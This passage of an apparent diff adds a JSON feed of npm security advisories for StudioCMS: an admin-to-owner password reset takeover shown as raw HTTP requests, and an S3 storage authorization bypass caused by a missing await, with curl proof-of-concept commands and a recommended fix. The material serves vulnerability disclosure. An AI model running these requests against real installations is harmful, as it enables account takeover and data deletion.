application/json\n\n{\"originPathname\":\"http://127.0.0.1:4321/dashboard\"}\n</code></pre>\n<p>Response:</p>\n<pre><code>{\n  \"isLoggedIn\": true,\n  \"user\": {\n    \"id\": \"eacee42e-ae7e-4e9e-945b-68e26696ece4\",\n    \"name\": \"dummy03\",\n    \"username\": \"dummy03\"\n  },\n  \"permissionLevel\": \"admin\"\n}\n</code></pre>\n<p><strong>Step 2 — Generate Password Reset Token for the Owner</strong>\nThe admin sends a request to create a reset link targeting the owner's UUID:</p>\n<pre><code>POST /studiocms_api/dashboard/create-reset-link HTTP/1.1\nHost: 127.0.0.1:4321\nCookie: auth_session=&lt;admin_session_cookie&gt;\nContent-Type: application/json\n\n{\"userId\": \"2450bf33-0135-4142-80be-9854f9a5e9f1\"}\n</code></pre>\n<p>Response:</p>\n<pre><code>{\n  \"id\": \"e11c98ac-d523-4404-b9c6-921d7d01cdcd\",\n  \"userId\": \"2450bf33-0135-4142-80be-9854f9a5e9f1\",\n  \"token\": \"&lt;reset_jwt_token&gt;\"\n}\n</code></pre>\n<p>The server generated a valid password reset JWT for the owner account and returned it to the admin caller.</p>\n<p><strong>Step 3 — Reset the Owner's Password</strong>\nUsing all three values from the previous response (id, userId, token), the attacker sets a new password for the owner:</p>\n<pre><code>POST /studiocms_api/dashboard/reset-password HTTP/1.1\nHost: 127.0.0.1:4321\nCookie: auth_session=&lt;admin_session_cookie&gt;\nContent-Type: application/json\n\n{\n  \"id\": \"e11c98ac-d523-4404-b9c6-921d7d01cdcd\",\n  \"userid\": \"2450bf33-0135-4142-80be-9854f9a5e9f1\",\n  \"token\": \"&lt;reset_jwt_token&gt;\",\n  \"password\": \"pwned1234@@\",\n  \"confirm_password\": \"pwned1234@@\"\n}\n</code></pre>\n<p>Response:</p>\n<pre><code>{\"message\": \"User password updated successfully\"}\n</code></pre>\n<p>The owner's password has been changed. The admin can now log in as the owner with the new credentials, gaining full control of the StudioCMS instance.</p>\n<h2 id=\"impact\">Impact</h2>\n<ul>\n<li><strong>Owner Account Takeover:</strong> Any admin can change the owner's password and assume full control of the StudioCMS instance, including all content, user management, and system configuration.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/withstudiocms/studiocms/security/advisories/GHSA-h7vr-cg25-jf8c\">https://github.com/withstudiocms/studiocms/security/advisories/GHSA-h7vr-cg25-jf8c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-32103\">https://nvd.nist.gov/vuln/detail/CVE-2026-32103</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h7vr-cg25-jf8c\">https://github.com/advisories/GHSA-h7vr-cg25-jf8c</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T14:49:38.000Z",
+          "date_published": "2026-03-12T14:49:38.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-h7vr-cg25-jf8c"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      },
+      {
+        "source": "npm_security_advisories",
+        "id": "b626d63d1dc3d19fbedc4e4b1482fec1",
+        "url": "https://github.com/advisories/GHSA-mm78-fgq8-6pgr",
+        "published_at": null,
+        "updated_at": null,
+        "headline": "[@studiocms/s3-storage] StudioCMS S3 Storage Manager Authorization Bypass via Missing `await` on Async Auth Check",
+        "content": {
+          "lang": "en"
+        },
+        "provenance": {
+          "fetched_at": "2026-03-12T19:10:09Z",
+          "evidence_urls": [
+            "https://github.com/advisories/GHSA-mm78-fgq8-6pgr"
+          ],
+          "content_hash": "sha256:b1168aaf7d66dde106fa156a9c38ae7a984f6cd6e3444e5ff3b52e488a642405"
+        },
+        "source_payload": {
+          "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>The S3 storage manager's <code>isAuthorized()</code> function is declared <code>async</code> (returns <code>Promise&lt;boolean&gt;</code>) but is called without <code>await</code> in both the POST and PUT handlers. Since a Promise object is always truthy in JavaScript, <code>!isAuthorized(type)</code> always evaluates to <code>false</code>, completely bypassing the authorization check. Any authenticated user with the lowest <code>visitor</code> role can upload, delete, rename, and list all files in the S3 bucket.</p>\n<h2 id=\"details\">Details</h2>\n<p>The <code>isAuthorized</code> function is typed as returning <code>Promise&lt;boolean&gt;</code> in <code>packages/studiocms/src/handlers/storage-manager/definitions.ts:88</code>:</p>\n<pre><code class=\"language-typescript\">export type ParsedContext = {\n    getJson: () =&gt; Promise&lt;ContextJsonBody&gt;;\n    getArrayBuffer: () =&gt; Promise&lt;ArrayBuffer&gt;;\n    getHeader: (name: string) =&gt; string | null;\n    isAuthorized: (type?: AuthorizationType) =&gt; Promise&lt;boolean&gt;;  // async\n};\n</code></pre>\n<p>Both context drivers implement it as <code>async</code> — <code>packages/studiocms/src/handlers/storage-manager/core/effectify-astro-context.ts:32</code>:</p>\n<pre><code class=\"language-typescript\">isAuthorized: async (type) =&gt; {\n    switch (type) {\n        case 'headers': {\n            // ... token verification ...\n            const isEditor = level &gt;= UserPermissionLevel.editor;\n            if (!isEditor) return false;\n            return true;\n        }\n        default: {\n            const isEditor = locals.StudioCMS.security?.userPermissionLevel.isEditor || false;\n            return isEditor;\n        }\n    }\n},\n</code></pre>\n<p>But in the S3 storage manager, it's called without <code>await</code> — <code>packages/@studiocms/s3-storage/src/s3-storage-manager.ts:200</code>:</p>\n<pre><code class=\"language-typescript\">if (authRequiredActions.includes(jsonBody.action) &amp;&amp; !isAuthorized(type)) {\n    return { data: { error: 'Unauthorized' }, status: 401 };\n}\n</code></pre>\n<p>And again at line 372 (PUT handler):</p>\n<pre><code class=\"language-typescript\">if (!isAuthorized(type)) {\n    return { data: { error: 'Unauthorized' }, status: 401 };\n}\n</code></pre>\n<p><code>isAuthorized(type)</code> returns a <code>Promise</code> object. <code>!Promise{...}</code> is always <code>false</code> because a Promise is truthy. The 401 response is never returned.</p>\n<p><strong>Execution flow:</strong></p>\n<ol>\n<li>Visitor-role user sends POST to <code>/studiocms_api/integrations/storage/manager</code></li>\n<li><code>AstroLocalsMiddleware</code> verifies session exists — passes (visitor is logged in)</li>\n<li>Handler calls <code>!isAuthorized('locals')</code> → evaluates <code>!Promise{...}</code> = <code>false</code></li>\n<li>Authorization check is skipped entirely</li>\n<li>Visitor performs the requested storage operation</li>\n</ol>\n<h2 id=\"poc\">PoC</h2>\n<pre><code class=\"language-bash\"># 1. Log in as a visitor-role user and obtain session cookie\n\n# 2. List all files in S3 bucket (should require editor+)\ncurl -X POST 'http://localhost:4321/studiocms_api/integrations/storage/manager' \\\n  -H 'Cookie: studiocms-session=&lt;visitor-session-token&gt;' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"action\":\"list\",\"prefix\":\"\"}'\n\n# Expected: 401 Unauthorized\n# Actual: 200 with full bucket listing\n\n# 3. Upload a file as visitor (should require editor+)\ncurl -X PUT 'http://localhost:4321/studiocms_api/integrations/storage/manager' \\\n  -H 'Cookie: studiocms-session=&lt;visitor-session-token&gt;' \\\n  -H 'Content-Type: application/octet-stream' \\\n  -H 'x-storage-key: malicious/payload.html' \\\n  --data-binary '&lt;h1&gt;Uploaded by visitor&lt;/h1&gt;'\n\n# Expected: 401 Unauthorized\n# Actual: 200 File uploaded\n\n# 4. Delete a file as visitor (should require editor+)\ncurl -X POST 'http://localhost:4321/studiocms_api/integrations/storage/manager' \\\n  -H 'Cookie: studiocms-session=&lt;visitor-session-token&gt;' \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"action\":\"delete\",\"key\":\"important/document.pdf\"}'\n\n# Expected: 401 Unauthorized\n# Actual: 200 File deleted\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n<ul>\n<li>Any authenticated visitor gains full S3 storage management (upload, delete, rename, list) — capabilities restricted to editor role and above</li>\n<li>Attacker can delete arbitrary files from the S3 bucket, causing data loss</li>\n<li>Attacker can list all files and generate presigned download URLs, exposing all stored content</li>\n<li>Attacker can upload arbitrary files or rename existing ones, replacing legitimate content with malicious payloads</li>\n</ul>\n<h2 id=\"recommended-fix\">Recommended Fix</h2>\n<p>Add <code>await</code> to both <code>isAuthorized()</code> calls in <code>packages/@studiocms/s3-storage/src/s3-storage-manager.ts</code>:</p>\n<pre><code class=\"language-typescript\">// POST handler (line 200) — before:\nif (authRequiredActions.includes(jsonBody.action) &amp;&amp; !isAuthorized(type)) {\n\n// After:\nif (authRequiredActions.includes(jsonBody.action) &amp;&amp; !(await isAuthorized(type))) {\n\n// PUT handler (line 372) — before:\nif (!isAuthorized(type)) {\n\n// After:\nif (!(await isAuthorized(type))) {\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/withstudiocms/studiocms/security/advisories/GHSA-mm78-fgq8-6pgr\">https://github.com/withstudiocms/studiocms/security/advisories/GHSA-mm78-fgq8-6pgr</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2026-32101\">https://nvd.nist.gov/vuln/detail/CVE-2026-32101</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-mm78-fgq8-6pgr\">https://github.com/advisories/GHSA-mm78-fgq8-6pgr</a></li>\n</ul>\n",
+          "date_modified": "2026-03-12T14:49:31.000Z",
+          "date_published": "2026-03-12T14:49:30.000Z",
+          "author": {
+            "name": "GitHub",
+            "url": "https://github.com/advisories/GHSA-mm78-fgq8-6pgr"
+          },
+          "tags": [
+            "severity"
+          ]
+        }
+      }
+    ],
+    "updated": [],
+    "removed": []
+  },
+  "counts": {
+    "items": 20,
+    "updated": 0,
+    "removed": 0
+  },
+  "integrity_reset": false
+}
